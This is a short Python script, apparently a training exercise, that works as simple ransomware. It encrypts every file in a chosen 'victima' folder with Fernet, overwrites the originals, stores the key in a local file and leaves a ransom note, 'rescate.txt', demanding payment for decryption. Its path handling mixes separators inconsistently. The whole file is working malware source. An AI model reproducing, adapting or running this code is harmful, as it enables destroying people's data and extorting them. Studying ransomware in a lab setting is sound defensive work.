#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Aug 13 11:18:34 2021

@author: Drxl
"""

from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)
        
def load_key():
    return open('key.key','rb').read()

def encrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item,'wb') as file:
            file.write(encrypted_data)

#Aquí en path_to_encrypt se debe poner la dirección absoluta del archivo
# o archivos a encriptar.
if __name__ == '__main__':
    path_to_encrypt = '//home//juan//PythonUdemy//security//victima'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]
    
    generate_key()
    key = load_key()
    encrypt(full_path,key)
    
    with open(path_to_encrypt+'\\'+'rescate.txt','w') as file:
        file.write('Crypto was here- \n')
        file.write('if you want de-encrypt pay here:')